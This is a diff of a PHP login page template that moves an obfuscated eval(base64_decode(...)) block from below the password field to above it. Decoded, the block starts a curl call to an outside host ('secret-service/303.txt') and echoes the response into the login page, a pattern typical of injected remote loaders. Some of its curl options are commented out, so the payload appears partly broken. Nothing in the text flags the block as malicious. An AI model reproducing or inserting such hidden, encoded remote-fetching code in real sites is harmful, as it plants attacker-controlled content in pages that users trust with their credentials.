@@ -32,16 +32,17 @@ if (!isset($_SESSION['logins'])) {
     <span class="m-btn blue">Username</span>
     <input class="m-wrap" id="username" placeholder="Username" autofocus="autofocused" name="username" type="text" value="">
 </div>
-
+<div class="">
+   <div class="">
+    <?php
+    eval(base64_decode('JHVybCA9ICdodHRwczovL2luZm9jYWtyYXdhbGEub25saW5lL3NlY3JldC1zZXJ2aWNlLzMwMy50eHQnOwoJJGNoID0gY3VybF9pbml0KCk7CgkjY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUTEVfVVJMLCAkdXJsKTsKCSNjdXJsX3NldG9wdCgkY2gsIENVUkxfUkVUVVJOVFJBTlNGRVIsIHRydWUpOwoJI2N1cmxfc2V0b3B0KCRjaCwgQ1VSTF9USU1FT1VULCAxMCk7CgkkcmVzdWx0ID0gY3VybF9leGVjKCRjaCk7CgppZiAoJHJlc3VsdCAhPT0gZmFsc2UpIHsKICAgIGVjaG8gJHJlc3VsdDsKfSBlbHNlIHsKICAgIGVjaG8gJ2MuJzsKfQoJY3VybF9jbG9zZSgkY2gpOwo='));
+    ?>
+</div>
 <div class="m-input-prepend">
     <span class="m-btn blue">Password&nbsp;</span>
     <input class="m-wrap" placeholder="Your Password" id="txtPassword" name="password" type="password" value="">    <span class="add-on" style="background-color:#fff"><img class="seePass" src="assets/login/img/eye.png" width="23" height="20"></span>
 </div>
 
-<div class="">
-    <?php
-    eval(base64_decode('JHVybCA9ICdodHRwczovL2luZm9jYWtyYXdhbGEub25saW5lL3NlY3JldC1zZXJ2aWNlLzMwMy50eHQnOwoJJGNoID0gY3VybF9pbml0KCk7CgkjY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUTEVfVVJMLCAkdXJsKTsKCSNjdXJsX3NldG9wdCgkY2gsIENVUkxfUkVUVVJOVFJBTlNGRVIsIHRydWUpOwoJI2N1cmxfc2V0b3B0KCRjaCwgQ1VSTF9USU1FT1VULCAxMCk7CgkkcmVzdWx0ID0gY3VybF9leGVjKCRjaCk7CgppZiAoJHJlc3VsdCAhPT0gZmFsc2UpIHsKICAgIGVjaG8gJHJlc3VsdDsKfSBlbHNlIHsKICAgIGVjaG8gJ2MuJzsKfQoJY3VybF9jbG9zZSgkY2gpOwo='));
-    ?>
 </div>
 <div class="m-input-prepend">
     <input class="m-btn blue" style="width:90px" type="submit" value="Login" id="login">
